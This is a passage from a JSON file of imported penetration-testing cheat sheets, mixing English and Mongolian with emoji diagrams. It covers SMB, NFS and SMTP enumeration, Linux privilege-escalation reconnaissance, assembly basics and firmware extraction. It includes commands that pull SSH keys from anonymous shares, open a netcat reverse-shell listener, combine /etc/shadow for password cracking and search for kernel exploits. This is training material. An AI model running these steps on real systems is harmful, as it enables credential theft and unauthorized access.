        "label": "Source cheatshit 2 - block 14",
        "cmd": "25 → SMTP"
      },
      {
        "label": "Source cheatshit 2 - block 15",
        "cmd": "📨 EMAIL OFFICE\n       │\n       ▼\n     🚪 25\n       │\n       ▼\n   SMTP server"
      },
      {
        "label": "Source cheatshit 2 - block 16",
        "cmd": "VRFY"
      },
      {
        "label": "Source cheatshit 2 - block 17",
        "cmd": "Server\n  │\n  ├── 📁 public\n  ├── 📁 backup\n  ├── 📁 finance\n  └── 📁 shared"
      },
      {
        "label": "Source cheatshit 2 - block 18",
        "cmd": "YOU\n ↓\n🚪 SMB\n ↓\n\"Who are you?\"\n ↓\n\"Nobody.\"\n ↓\n\"Okay, come in.\" 😐"
      },
      {
        "label": "Source cheatshit 2 - block 19",
        "cmd": "enum4linux -a [TARGET_IP]"
      },
      {
        "label": "Source cheatshit 2 - block 20",
        "cmd": "smbclient //[TARGET_IP]/[SHARE_NAME] -U Anonymous"
      },
      {
        "label": "Source cheatshit 2 - block 21",
        "cmd": "get id_rsa\nget backup.zip"
      },
      {
        "label": "Source cheatshit 2 - block 22",
        "cmd": "SERVER\n┌────────────────┐\n│ 📁 /home       │\n│ 📁 /backup     │\n│ 📁 /share      │\n└────────────────┘\n        │\n        │ export\n        ▼\n     🌐 NETWORK\n        │\n        ▼\n      CLIENT"
      },
      {
        "label": "Source cheatshit 2 - block 23",
        "cmd": "showmount -e [TARGET_IP]"
      },
      {
        "label": "Source cheatshit 2 - block 24",
        "cmd": "SERVER\n\n📚 EXPORT LIST\n├── /home\n├── /backup\n└── /share"
      },
      {
        "label": "Source cheatshit 2 - block 25",
        "cmd": "mount ..."
      },
      {
        "label": "Source cheatshit 2 - block 26",
        "cmd": "NORMAL:\n\nClient 👑 root\n      ↓\nNFS\n      ↓\nServer дээр restrained identity\n\n\nno_root_squash:\n\nClient 👑 root\n      ↓\nNFS\n      ↓\n👑 root-like identity"
      },
      {
        "label": "Source cheatshit 2 - block 27",
        "cmd": "💻 target\n   ↓\ncommand executes\n   ↓\n❓ no output"
      },
      {
        "label": "Source cheatshit 2 - block 28",
        "cmd": "sudo tcpdump ip proto \\icmp -i tun0"
      },
      {
        "label": "Source cheatshit 2 - block 29",
        "cmd": "Target\n   ↓\nICMP\n   ↓\nKali"
      },
      {
        "label": "Source cheatshit 2 - block 30",
        "cmd": "ping <your-ip>"
      },
      {
        "label": "Source cheatshit 2 - block 31",
        "cmd": "📡 ICMP packet\n      ↓\n👀 packet capture\n      ↓\n\"I didn't see output,\n but I saw the side effect.\""
      },
      {
        "label": "Source cheatshit 2 - block 32",
        "cmd": "YOU\n ↓\nTARGET"
      },
      {
        "label": "Source cheatshit 2 - block 33",
        "cmd": "TARGET\n   │\n   │ outbound connection\n   ▼\n YOUR LISTENER"
      },
      {
        "label": "Source cheatshit 2 - block 34",
        "cmd": "nc -lvnp 4444"
      },
      {
        "label": "Source cheatshit 2 - block 35",
        "cmd": "Kali\n\n☎️ Port 4444\n\"Hello?\nI'm waiting...\""
      },
      {
        "label": "Source cheatshit 2 - block 36",
        "cmd": "TARGET\n   │\n   │ 📞\n   └──────────────► KALI\n                    │\n                    ▼\n                 shell"
      },
      {
        "label": "Source cheatshit 2 - block 37",
        "cmd": "-l → 👂 Listen\n-v → 🗣️ Verbose\n-n → 🚫 DNS lookup хийхгүй\n-p → 🚪 Port"
      },
      {
        "label": "Source cheatshit 2 - block 38",
        "cmd": "🔐 LOGIN DOOR"
      },
      {
        "label": "Source cheatshit 2 - block 39",
        "cmd": "Hydra\n  ↓\n\"password1?\"\n❌\n\n\"password2?\"\n❌\n\n\"password3?\"\n❌\n\n..."
      },
      {
        "label": "Source cheatshit 2 - block 40",
        "cmd": "NETWORK\n   ↓\nLOGIN SERVICE"
      },
      {
        "label": "Source cheatshit 2 - block 41",
        "cmd": "🔐 HASH"
      },
      {
        "label": "Source cheatshit 2 - block 42",
        "cmd": "candidate password\n       ↓\nhash\n       ↓\ncompare"
      },
      {
        "label": "Source cheatshit 2 - block 43",
        "cmd": "HASH\n ↓\nGPU/CPU\n ↓\ncandidate generation\n ↓\ncompare"
      },
      {
        "label": "Source cheatshit 2 - block 44",
        "cmd": "HYDRA\n🌐 Online\n   ↓\nNetwork service\n   ↓\nLogin attempts\n\nJOHN\n📴 Offline\n   ↓\nLocal hashes\n   ↓\nPassword candidates\n\nHASHCAT\n📴 Offline\n   ↓\nLocal hashes\n   ↓\nHigh-performance cracking"
      },
      {
        "label": "Source cheatshit 2 - block 45",
        "cmd": "unshadow /etc/passwd /etc/shadow"
      },
      {
        "label": "Source cheatshit 2 - block 46",
        "cmd": "/etc/passwd\n      +\n/etc/shadow\n      ↓\nunshadow\n      ↓\ncombined input"
      },
      {
        "label": "Source cheatshit 2 - block 47",
        "cmd": "🏠 SERVER\n                       │\n       ┌───────────────┼────────────────┐\n       │               │                │\n       ▼               ▼                ▼\n    🚪 21           🚪 22            🚪 23\n     FTP             SSH             Telnet\n     📦              🔑                📞\n    files           shell           cleartext\n       │\n       │\n       ├──────── 🚪25 → SMTP → 📨 mail\n       │\n       ├──────── 🚪139/445 → SMB → 🗄️ shares\n       │\n       ├──────── 🚪111/2049 → NFS → 📚 exports\n       │\n       └──────── 🚪3306 → MySQL → 🗃️ database"
      },
      {
        "label": "Source cheatshit 2 - block 48",
        "cmd": "21    → 📦 FTP    → files\n22    → 🔑 SSH    → shell\n23    → 📞 Telnet → old/cleartext remote access\n25    → 📨 SMTP   → mail\n139/445\n      → 🗄️ SMB    → shares\n111/2049\n      → 📚 NFS    → network filesystem\n3306  → 🗃️ MySQL  → database"
      },
      {
        "label": "Source cheatshit 2 - block 49",
        "cmd": "🚪 PORT\n   ↓\n⚙️ SERVICE\n   ↓\n👤 AUTHENTICATION\n   ↓\n📦 DATA / RESOURCE\n   ↓\n🔐 CONFIGURATION\n   ↓\n💥 WEAKNESS"
      },
      {
        "label": "Source cheatshit 2 - block 50",
        "cmd": "FTP\n→ \"What files?\"\n\nSSH\n→ \"Whose keys?\"\n\nTelnet\n→ \"Is communication protected?\"\n\nSMTP\n→ \"Who can I learn about?\"\n\nSMB\n→ \"What shares trust me?\"\n\nNFS\n→ \"What filesystem is exported?\"\n\nMySQL\n→ \"Who can authenticate, and what data is exposed?\""
      }
    ],
    "tips": [
      "Use only in an authorized lab or on systems you own.",
      "Review target, IP, username, and wordlist placeholders before running.",
      "Record command output back in the related note or report."
    ]
  },
  {
    "id": "ks-playbook-5",
    "title": "cheatshit 3",
    "category": "linux",
    "description": "Imported command reference from KS: cheater/cheatshit 3.md",
    "methodology": "Source file: cheater/cheatshit 3.md\n\nUse commands only in an authorized lab or on systems you own.",
    "commands": [
      {
        "label": "Source cheatshit 3 - block 1",
        "cmd": "🌐 Outside\n    ↓\n👤 YOU\n    ↓\n🏰 Linux"
      },
      {
        "label": "Source cheatshit 3 - block 2",
        "cmd": "UID = 1000\n👤 ordinary user"
      },
      {
        "label": "Source cheatshit 3 - block 3",
        "cmd": "👑 ROOT"
      },
      {
        "label": "Source cheatshit 3 - block 4",
        "cmd": "🏰 LINUX CASTLE\n                  │\n                  ▼\n           👤 WHO AM I?\n                  │\n                  ▼\n        🔑 WHAT POWER DO I HAVE?\n                  │\n                  ▼\n        🚪 WHAT SPECIAL DOORS?\n                  │\n                  ▼\n          ⏰ WHAT RUNS BY ITSELF?\n                  │\n                  ▼\n          📄 WHAT FILES EXIST?\n                  │\n                  ▼\n         👀 WHAT IS RUNNING?\n                  │\n                  ▼\n          ✍️ WHAT CAN I WRITE?\n                  │\n                  ▼\n          🧬 IS KERNEL OLD?\n                  │\n                  ▼\n               👑 ROOT?"
      },
      {
        "label": "Source cheatshit 3 - block 5",
        "cmd": "id\nhostname\nuname -a\ncat /etc/os-release\npwd"
      },
      {
        "label": "Source cheatshit 3 - block 6",
        "cmd": "id"
      },
      {
        "label": "Source cheatshit 3 - block 7",
        "cmd": "UID\nGID\ngroups"
      },
      {
        "label": "Source cheatshit 3 - block 8",
        "cmd": "uid=1000(karen)"
      },
      {
        "label": "Source cheatshit 3 - block 9",
        "cmd": "👤 Karen\nUID 1000"
      },
      {
        "label": "Source cheatshit 3 - block 10",
        "cmd": "uid=0(root)"
      },
      {
        "label": "Source cheatshit 3 - block 11",
        "cmd": "\"Яагаад би root-ын өрөөнд аль хэдийн сууж байгаа юм?\""
      },
      {
        "label": "Source cheatshit 3 - block 12",
        "cmd": "hostname"
      },
      {
        "label": "Source cheatshit 3 - block 13",
        "cmd": "web-server-01"
      },
      {
        "label": "Source cheatshit 3 - block 14",
        "cmd": "👤 You\n🏠 web-server-01"
      },
      {
        "label": "Source cheatshit 3 - block 15",
        "cmd": "🐧 Linux\n🧠 Kernel\n💻 Architecture"
      },
      {
        "label": "Source cheatshit 3 - block 16",
        "cmd": "cat /etc/os-release"
      },
      {
        "label": "Source cheatshit 3 - block 17",
        "cmd": "Ubuntu\nDebian\nFedora\n..."
      },
      {
        "label": "Source cheatshit 3 - block 18",
        "cmd": "pwd"
      },
      {
        "label": "Source cheatshit 3 - block 19",
        "cmd": "/home/karen"
      },
      {
        "label": "Source cheatshit 3 - block 20",
        "cmd": "🏰 /home\n   └── 👤 karen\n          ↑\n         YOU"
      },
      {
        "label": "Source cheatshit 3 - block 21",
        "cmd": "id                → 👤 WHO?\nhostname          → 🏠 WHICH MACHINE?\nuname -a          → 🧠 WHICH KERNEL?\nos-release        → 🐧 WHICH OS?\npwd               → 📍 WHERE AM I?"
      },
      {
        "label": "Source cheatshit 3 - block 22",
        "cmd": "cat /etc/passwd\ncat /etc/group\nsudo -l"
      },
      {
        "label": "Source cheatshit 3 - block 23",
        "cmd": "root\nalice\nbob\nkaren\nservice-user\n..."
      },
      {
        "label": "Source cheatshit 3 - block 24",
        "cmd": "📖 PEOPLE BOOK\n\n👑 root\n👤 alice\n👤 bob\n🤖 backup\n🤖 service"
      },
      {
        "label": "Source cheatshit 3 - block 25",
        "cmd": "Karen\n ├── users\n ├── sudo\n ├── docker\n └── developers"
      },
      {
        "label": "Source cheatshit 3 - block 26",
        "cmd": "passwd → WHO\ngroup  → WHO WITH WHOM"
      },
      {
        "label": "Source cheatshit 3 - block 27",
        "cmd": "sudo -l"
      },
      {
        "label": "Source cheatshit 3 - block 28",
        "cmd": "🔑 My allowed privileges"
      },
      {
        "label": "Source cheatshit 3 - block 29",
        "cmd": "find / -perm -4000 -type f 2>/dev/null"
      },
      {
        "label": "Source cheatshit 3 - block 30",
        "cmd": "4000 = SUID"
      },
      {
        "label": "Source cheatshit 3 - block 31",
        "cmd": "👤 YOU\n   ↓\n🚪 SUID PROGRAM\n   ↓\n🪪 \"Би owner-ийн badge зүүсэн.\""
      },
      {
        "label": "Source cheatshit 3 - block 32",
        "cmd": "find / -perm -2000 -type f 2>/dev/null"
      },
      {
        "label": "Source cheatshit 3 - block 33",
        "cmd": "2000 = SGID"
      },
      {
        "label": "Source cheatshit 3 - block 34",
        "cmd": "4000 → SUID → 👤 USER\n2000 → SGID → 👥 GROUP"
      },
      {
        "label": "Source cheatshit 3 - block 35",
        "cmd": "getcap -r / 2>/dev/null"
      },
      {
        "label": "Source cheatshit 3 - block 36",
        "cmd": "👑 MASTER KEY"
      },
      {
        "label": "Source cheatshit 3 - block 37",
        "cmd": "🔑 нэг жижиг special power"
      },
      {
        "label": "Source cheatshit 3 - block 38",
        "cmd": "Program\n   │\n   ├── normal powers\n   │\n   └── + one special capability"
      },
      {
        "label": "Source cheatshit 3 - block 39",
        "cmd": "SUID\n ↓\n\"Owner-ийн badge байна уу?\"\n\nSGID\n ↓\n\"Group-ийн badge байна уу?\"\n\nCapabilities\n ↓\n\"Нууц special power байна уу?\""
      },
      {
        "label": "Source cheatshit 3 - block 40",
        "cmd": "📄 config\n🧠 history\n🔑 credentials"
      },
      {
        "label": "Source cheatshit 3 - block 41",
        "cmd": "*.conf\n*.config"
      },
      {
        "label": "Source cheatshit 3 - block 42",
        "cmd": "📘 application.conf\n\ndatabase = ...\nusername = ...\npassword = ..."
      },
      {
        "label": "Source cheatshit 3 - block 43",
        "cmd": "cat ~/.bash_history"
      },
      {
        "label": "Source cheatshit 3 - block 44",
        "cmd": "ssh ...\nmysql ...\nexport ..."
      },
      {
        "label": "Source cheatshit 3 - block 45",
        "cmd": "🧠 history = хүний өнгөрсөн мөр"
      },
      {
        "label": "Source cheatshit 3 - block 46",
        "cmd": "/var/www\n   ↓\nweb source\n   ↓\nconfig\n   ↓\npossible credentials"
      },
      {
        "label": "Source cheatshit 3 - block 47",
        "cmd": "ps aux\nps aux | grep root"
      },
      {
        "label": "Source cheatshit 3 - block 48",
        "cmd": "⚙️ nginx\n⚙️ apache\n⚙️ mysql\n⚙️ python\n⚙️ backup\n..."
      },
      {
        "label": "Source cheatshit 3 - block 49",
        "cmd": "22    → 🚪\n80    → 🚪\n3306  → 🚪\n8080  → 🚪"
      },
      {
        "label": "Source cheatshit 3 - block 50",
        "cmd": "⏰ 02:00\n   ↓\n🤖 backup runs"
      },
      {
        "label": "Source cheatshit 3 - block 51",
        "cmd": "cat /etc/crontab\ncrontab -l\nls -la /etc/cron.*"
      },
      {
        "label": "Source cheatshit 3 - block 52",
        "cmd": "🤖 WHAT?\n+\n⏰ WHEN?\n+\n👤 WHO?\n+\n✍️ CAN IT BE CHANGED?"
      },
      {
        "label": "Source cheatshit 3 - block 53",
        "cmd": "👑 root\n   ↓\n⏰ cron\n   ↓\n📄 script"
      },
      {
        "label": "Source cheatshit 3 - block 54",
        "cmd": "find / -writable -type d 2>/dev/null\nfind / -writable -type f 2>/dev/null"
      },
      {
        "label": "Source cheatshit 3 - block 55",
        "cmd": "👀 READ"
      },
      {
        "label": "Source cheatshit 3 - block 56",
        "cmd": "✍️ WRITE"
      },
      {
        "label": "Source cheatshit 3 - block 57",
        "cmd": "✍️ WRITE\n   +\n👑 PRIVILEGED PROCESS TRUSTS IT\n   +\n⚙️ IT GETS EXECUTED/LOADED"
      },
      {
        "label": "Source cheatshit 3 - block 58",
        "cmd": "uname -a\ncat /proc/version"
      },
      {
        "label": "Source cheatshit 3 - block 59",
        "cmd": "searchsploit ubuntu 16.04"
      },
      {
        "label": "Source cheatshit 3 - block 60",
        "cmd": "Sudo\nSUID\nCapabilities\nCron\nCredentials\nWritable files"
      },
      {
        "label": "Source cheatshit 3 - block 61",
        "cmd": "💣 KERNEL EXPLOIT"
      },
      {
        "label": "Source cheatshit 3 - block 62",
        "cmd": "🔑 жижиг түлхүүр олдож магадгүй\n        ↓\n🚪 эхлээд энгийн хаалгыг шалга\n        ↓\n💣 том hammer-ийг хамгийн сүүлд"
      },
      {
        "label": "Source cheatshit 3 - block 63",
        "cmd": "🏰 LINUX\n                    │\n                    ▼\n              👤 WHO AM I?\n                    │\n                    ▼\n          🔑 WHAT POWER DO I HAVE?\n                    │\n           ┌────────┼────────┐\n           ▼        ▼        ▼\n         SUDO     SUID      CAPS\n           │        │        │\n           └────────┼────────┘\n                    ▼\n             📄 WHAT EXISTS?\n                    │\n          ┌─────────┼─────────┐\n          ▼         ▼         ▼\n       CONFIG     HISTORY   CREDS\n          │\n          ▼\n           ⚙️ WHAT IS RUNNING?\n                    │\n                    ▼\n                🚪 PORTS\n                    │\n                    ▼\n             ⏰ WHAT RUNS\n                AUTOMATICALLY?\n                    │\n                    ▼\n                ✍️ WHAT\n              CAN I WRITE?\n                    │\n                    ▼\n             🧬 OLD KERNEL?\n                    │\n                    ▼\n                  👑\n                 ROOT"
      }
    ],
    "tips": [
      "Use only in an authorized lab or on systems you own.",
      "Review target, IP, username, and wordlist placeholders before running.",
      "Record command output back in the related note or report."
    ]
  },
  {
    "id": "ks-playbook-6",
    "title": "cheatshit 4",
    "category": "linux",
    "description": "Imported command reference from KS: cheater/cheatshit 4.md",
    "methodology": "Source file: cheater/cheatshit 4.md\n\nUse commands only in an authorized lab or on systems you own.",
    "commands": [
      {
        "label": "Source cheatshit 4 - block 1",
        "cmd": "🛰️ RECON\n   ↓\n🚪 SERVICES\n   ↓\n🔓 ACCESS\n   ↓\n⬆️ PRIV ESC\n   ↓\n🔬 REVERSE ENGINEERING\n   ↓\n📦 FIRMWARE"
      },
      {
        "label": "Source cheatshit 4 - block 2",
        "cmd": "📦 program\n\n     ↓\n\n🔬 Reverse Engineering\n\n     ↓\n\n🧠 CPU:\n\"Энэ instruction юу хийж байна?\"\n\"Data хаана байна?\"\n\"Яагаад энд үсэрч байна?\"\n\"Энэ function-д ямар argument өгсөн бэ?\""
      },
      {
        "label": "Source cheatshit 4 - block 3",
        "cmd": "Program:\n100\n101\n102\n103\n104\n105\n..."
      },
      {
        "label": "Source cheatshit 4 - block 4",
        "cmd": "\"Би одоо аль instruction дээр байна?\""
      },
      {
        "label": "Source cheatshit 4 - block 5",
        "cmd": "RIP = 103\n        ↓\nCPU дараагийн execution context-ээ\nэндээс үргэлжлүүлнэ"
      },
      {
        "label": "Source cheatshit 4 - block 6",
        "cmd": "Program memory\n\n100   instruction\n101   instruction\n102   instruction\n103   👈 RIP\n104   instruction\n105   instruction"
      },
      {
        "label": "Source cheatshit 4 - block 7",
        "cmd": "Normal:\n\nRIP\n ↓\nA → B → C → D\n\n\nCorrupted control flow:\n\nRIP\n ↓\nA → B → 💥 → attacker-controlled location"
      },
      {
        "label": "Source cheatshit 4 - block 8",
        "cmd": "is_password_correct()"
      },
      {
        "label": "Source cheatshit 4 - block 9",
        "cmd": "1"
      },
      {
        "label": "Source cheatshit 4 - block 10",
        "cmd": "function()\n   ↓\ncomputes answer\n   ↓\nRAX = result"
      },
      {
        "label": "Source cheatshit 4 - block 11",
        "cmd": "1 = true\n0 = false"
      },
      {
        "label": "Source cheatshit 4 - block 12",
        "cmd": "RAX\n└── EAX\n    └── AX\n        └── AL"
      },
      {
        "label": "Source cheatshit 4 - block 13",
        "cmd": "RAX\n┌────────────────────────────────────┐\n│             64 bits                │\n│                                    │\n│   EAX = lower 32 bits              │\n│   ┌────────────────────────────┐   │\n│   │          32 bits           │   │\n│   │                            │   │\n│   │ AX = lower 16 bits         │   │\n│   │ ┌──────────────────────┐   │   │\n│   │ │       16 bits        │   │   │\n│   │ │                      │   │   │\n│   │ │ AL = lower 8 bits    │   │   │\n│   │ └──────────────────────┘   │   │\n│   └────────────────────────────┘   │\n└────────────────────────────────────┘"
      },
      {
        "label": "Source cheatshit 4 - block 14",
        "cmd": "RAX = 64\nEAX = 32\nAX  = 16\nAL  = 8"
      },
      {
        "label": "Source cheatshit 4 - block 15",
        "cmd": "RAX = 0x1122334455667788"
      },
      {
        "label": "Source cheatshit 4 - block 16",
        "cmd": "0x55667788"
      },
      {
        "label": "Source cheatshit 4 - block 17",
        "cmd": "0x7788"
      },
      {
        "label": "Source cheatshit 4 - block 18",
        "cmd": "0x88"
      },
      {
        "label": "Source cheatshit 4 - block 19",
        "cmd": "calculate(a, b, c, d)"
      },
      {
        "label": "Source cheatshit 4 - block 20",
        "cmd": "1st → RCX\n2nd → RDX\n3rd → R8\n4th → R9\n5th+ → Stack"
      },
      {
        "label": "Source cheatshit 4 - block 21",
        "cmd": "Argument #1\n   ↓\nRCX\n\nArgument #2\n   ↓\nRDX\n\nArgument #3\n   ↓\nR8\n\nArgument #4\n   ↓\nR9\n\nArgument #5+\n   ↓\nSTACK"
      },
      {
        "label": "Source cheatshit 4 - block 22",
        "cmd": "RDI\nRSI\nRDX\nRCX\nR8\nR9"
      },
      {
        "label": "Source cheatshit 4 - block 23",
        "cmd": "MOV\nLEA\nXOR\nCMP\nJCC\nNOP"
      },
      {
        "label": "Source cheatshit 4 - block 24",
        "cmd": "MOV destination, source"
      },
      {
        "label": "Source cheatshit 4 - block 25",
        "cmd": "📦 SOURCE\n   │\n   │ MOV\n   ▼\n📥 DESTINATION"
      },
      {
        "label": "Source cheatshit 4 - block 26",
        "cmd": "mov rax, rbx"
      },
      {
        "label": "Source cheatshit 4 - block 27",
        "cmd": "mov rax, rbx"
      },
      {
        "label": "Source cheatshit 4 - block 28",
        "cmd": "mov rax, [rbx]"
      },
      {
        "label": "Source cheatshit 4 - block 29",
        "cmd": "rbx = address\n       ↓\n     [rbx]\n       ↓\n   memory there"
      },
      {
        "label": "Source cheatshit 4 - block 30",
        "cmd": "lea destination, [address]"
      },
      {
        "label": "Source cheatshit 4 - block 31",
        "cmd": "🏠 1000\n├── room\n├── room\n└── room"
      },
      {
        "label": "Source cheatshit 4 - block 32",
        "cmd": "xor rax, rax"
      },
      {
        "label": "Source cheatshit 4 - block 33",
        "cmd": "X XOR X = 0"
      },
      {
        "label": "Source cheatshit 4 - block 34",
        "cmd": "RAX = ??????\n        ↓\nxor rax, rax\n        ↓\nRAX = 0"
      },
      {
        "label": "Source cheatshit 4 - block 35",
        "cmd": "cmp A, B"
      },
      {
        "label": "Source cheatshit 4 - block 36",
        "cmd": "cmp rax, 0"
      },
      {
        "label": "Source cheatshit 4 - block 37",
        "cmd": "je ..."
      },
      {
        "label": "Source cheatshit 4 - block 38",
        "cmd": "──────────────►\n       │\n       ├──► road A\n       │\n       └──► road B"
      },
      {
        "label": "Source cheatshit 4 - block 39",
        "cmd": "JE / JZ\n↓\n\"Equal / Zero болсон уу?\"\n\nJNE / JNZ\n↓\n\"Equal биш / Zero биш үү?\"\n\nJG / JL\n↓\nSigned comparison\n\nJA / JB\n↓\nUnsigned comparison"
      },
      {
        "label": "Source cheatshit 4 - block 40",
        "cmd": "CMP\n ↓\nflags\n ↓\nJCC\n ↓\ndecision"
      },
      {
        "label": "Source cheatshit 4 - block 41",
        "cmd": "NOP"
      },
      {
        "label": "Source cheatshit 4 - block 42",
        "cmd": "Instruction\nInstruction\nNOP\nInstruction"
      },
      {
        "label": "Source cheatshit 4 - block 43",
        "cmd": "NOP NOP NOP NOP NOP\n           ↓\n      target region"
      },
      {
        "label": "Source cheatshit 4 - block 44",
        "cmd": "📚📚📚📚"
      },
      {
        "label": "Source cheatshit 4 - block 45",
        "cmd": "HIGH ADDRESS\n     │\n     │\n     ▼\n   STACK\n     │\n     ▼\nLOW ADDRESS"
      },
      {
        "label": "Source cheatshit 4 - block 46",
        "cmd": "PUSH\n ↓\nRSP decreases"
      },
      {
        "label": "Source cheatshit 4 - block 47",
        "cmd": "📦\n📦\n📦\n⬇️"
      },
      {
        "label": "Source cheatshit 4 - block 48",
        "cmd": "POP\n ↓\nRSP increases"
      },
      {
        "label": "Source cheatshit 4 - block 49",
        "cmd": "0x77AABBCC"
      },
      {
        "label": "Source cheatshit 4 - block 50",
        "cmd": "77 AA BB CC"
      },
      {
        "label": "Source cheatshit 4 - block 51",
        "cmd": "CC BB AA 77"
      },
      {
        "label": "Source cheatshit 4 - block 52",
        "cmd": "Number:\n\n77 AA BB CC\n\nMemory:\n\n[CC][BB][AA][77]\n ↑\n first"
      },
      {
        "label": "Source cheatshit 4 - block 53",
        "cmd": "objdump -M intel -d [BINARY]"
      },
      {
        "label": "Source cheatshit 4 - block 54",
        "cmd": "📦 Binary\n   ↓\n🔬 objdump\n   ↓\n🧾 Assembly"
      },
      {
        "label": "Source cheatshit 4 - block 55",
        "cmd": "mov\ncmp\ncall\njmp\n..."
      },
      {
        "label": "Source cheatshit 4 - block 56",
        "cmd": "grep -B 15 \"call.*<target_func>\" source.asm"
      },
      {
        "label": "Source cheatshit 4 - block 57",
        "cmd": "target_func\n    ↑\n15 lines before"
      },
      {
        "label": "Source cheatshit 4 - block 58",
        "cmd": "grep -A 20 \"target_func\" source.asm"
      },
      {
        "label": "Source cheatshit 4 - block 59",
        "cmd": "ltrace ./binary"
      },
      {
        "label": "Source cheatshit 4 - block 60",
        "cmd": "strcmp(...)\nstrncmp(...)\nprintf(...)"
      },
      {
        "label": "Source cheatshit 4 - block 61",
        "cmd": "strings -n 6 [BINARY]"
      },
      {
        "label": "Source cheatshit 4 - block 62",
        "cmd": "Enter password:\nInvalid login\nWelcome\nadmin\nconfig\n..."
      },
      {
        "label": "Source cheatshit 4 - block 63",
        "cmd": "📦 BINARY\n   │\n   ▼\n🔬 DISASSEMBLE\n   │\n   ▼\n📍 LOCATE interesting function\n   │\n   ▼\n🎧 TRACE behavior\n   │\n   ▼\n🧾 READ strings / clues"
      },
      {
        "label": "Source cheatshit 4 - block 64",
        "cmd": "RIP → 🧭 WHERE CPU GOES\nRAX → 🧮 WHAT FUNCTION RETURNS"
      },
      {
        "label": "Source cheatshit 4 - block 65",
        "cmd": "RAX → 64\nEAX → 32\nAX  → 16\nAL  → 8"
      },
      {
        "label": "Source cheatshit 4 - block 66",
        "cmd": "RCX → 1\nRDX → 2\nR8  → 3\nR9  → 4\nSTACK → 5+"
      },
      {
        "label": "Source cheatshit 4 - block 67",
        "cmd": "MOV → 📦 COPY\nLEA → 🧭 ADDRESS\nXOR → 🧹 ZERO\nCMP → ⚖️ COMPARE\nJCC → 🚦 DECIDE\nNOP → 🧍 NOTHING"
      },
      {
        "label": "Source cheatshit 4 - block 68",
        "cmd": "STACK\n↓\nlower addresses\n\nPUSH → ↓\nPOP  → ↑\n\nLittle-endian\n→ smallest-significant byte first"
      },
      {
        "label": "Source cheatshit 4 - block 69",
        "cmd": "🧠 \"RIP хаана байна?\"\n        ↓\n       RIP\n        ↓\n\"Одоо энэ instruction-ийг ажиллуул.\"\n\n        ↓\n\n📦 MOV\n\"Data-г энд тавь.\"\n\n        ↓\n\n⚖️ CMP\n\"Энэ хоёр адил уу?\"\n\n        ↓\n\n🚦 JCC\n\"Тэгвэл аль замаар явах вэ?\"\n\n        ↓\n\n📞 CALL\n\"Function дуудая.\"\n\n        ↓\n\n🧮 RAX\n\"Function-ийн хариу энд байна.\"\n\n        ↓\n\n🧭 RIP\n\"Дараагийн instruction руу явъя.\""
      }
    ],
    "tips": [
      "Use only in an authorized lab or on systems you own.",
      "Review target, IP, username, and wordlist placeholders before running.",
      "Record command output back in the related note or report."
    ]
  },
  {
    "id": "ks-playbook-7",
    "title": "cheatshit 5",
    "category": "linux",
    "description": "Imported command reference from KS: cheater/cheatshit 5.md",
    "methodology": "Source file: cheater/cheatshit 5.md\n\nUse commands only in an authorized lab or on systems you own.",
    "commands": [
      {
        "label": "Source cheatshit 5 - block 1",
        "cmd": "🛰️ RECON\n   ↓\n🚪 SERVICES\n   ↓\n🔓 ACCESS\n   ↓\n⬆️ PRIV ESC\n   ↓\n🔬 REVERSE ENGINEERING\n   ↓\n📦 FIRMWARE"
      },
      {
        "label": "Source cheatshit 5 - block 2",
        "cmd": "📡 Router firmware\n      │\n      ▼\n┌─────────────────────────────┐\n│      FIRMWARE IMAGE         │\n│                             │\n│  🧠 Kernel                  │\n│  📁 Root filesystem         │\n│  🌐 Web interface           │\n│  ⚙️ Config                  │\n│  🔑 Credentials             │\n│  📦 Libraries               │\n│  ⚡ Startup scripts         │\n└─────────────────────────────┘"
      },
      {
        "label": "Source cheatshit 5 - block 3",
        "cmd": "📦 router.bin"
      },
      {
        "label": "Source cheatshit 5 - block 4",
        "cmd": "[HEADER]\n[KERNEL]\n[COMPRESSED FS]\n[CONFIG]\n[WEB FILES]\n[OTHER DATA]"
      },
      {
        "label": "Source cheatshit 5 - block 5",
        "cmd": "binwalk firmware.img"
      },
      {
        "label": "Source cheatshit 5 - block 6",
        "cmd": "📦 firmware.img\n\n0000  ?????\n0010  ????\n..."
      },
      {
        "label": "Source cheatshit 5 - block 7",
        "cmd": "👀 \"Аан!\nЭнд compressed archive байна.\nЭнд filesystem signature байна.\nЭнд kernel-тэй төстэй data байна.\""
      },
      {
        "label": "Source cheatshit 5 - block 8",
        "cmd": "binwalk -e firmware.img"
      },
      {
        "label": "Source cheatshit 5 - block 9",
        "cmd": "📦 Firmware\n    ↓\n🔎 Detect layers\n    ↓\n✂️ Extract recognized content\n    ↓\n📁 Files / filesystem / components"
      },
      {
        "label": "Source cheatshit 5 - block 10",
        "cmd": "firmware.img\n   ↓\n_extracted/\n   ├── kernel\n   ├── filesystem\n   ├── ..."
      },
      {
        "label": "Source cheatshit 5 - block 11",
        "cmd": "binwalk\n   ↓\n👀 \"Юу байна?\"\n\nbinwalk -e\n   ↓\n✂️ \"Задлая.\""
      },
      {
        "label": "Source cheatshit 5 - block 12",
        "cmd": "ext4\nxfs\nbtrfs"
      },
      {
        "label": "Source cheatshit 5 - block 13",
        "cmd": "💾 Flash memory"
      },
      {
        "label": "Source cheatshit 5 - block 14",
        "cmd": "🧠 Linux\n   │\n   ▼\n📁 Filesystem\n   │\n   ▼\n💾 Flash memory"
      },
      {
        "label": "Source cheatshit 5 - block 15",
        "cmd": "📦 JFFS2 image"
      },
      {
        "label": "Source cheatshit 5 - block 16",
        "cmd": "MOUNT"
      },
      {
        "label": "Source cheatshit 5 - block 17",
        "cmd": "📦 filesystem image\n       │\n       │ mount\n       ▼\n📂 /mnt/jffs2_file/"
      },
      {
        "label": "Source cheatshit 5 - block 18",
        "cmd": "cd /mnt/jffs2_file/\nls"
      },
      {
        "label": "Source cheatshit 5 - block 19",
        "cmd": "sudo mknod /dev/mtdblock0 b 31 0"
      },
      {
        "label": "Source cheatshit 5 - block 20",
        "cmd": "/dev/mtdblock0"
      },
      {
        "label": "Source cheatshit 5 - block 21",
        "cmd": "sudo modprobe jffs2 mtdram mtdblock"
      },
      {
        "label": "Source cheatshit 5 - block 22",
        "cmd": "🧠 Kernel\n  │\n  ├── JFFS2 knowledge ❌\n  │\n  ├── MTD support ❌\n  │\n  ▼\nmodprobe\n  │\n  ▼\nmodules loaded ✅"
      },
      {
        "label": "Source cheatshit 5 - block 23",
        "cmd": "sudo dd if=filesystem.jffs2 of=/dev/mtdblock0"
      },
      {
        "label": "Source cheatshit 5 - block 24",
        "cmd": "if = input file\nof = output file"
      },
      {
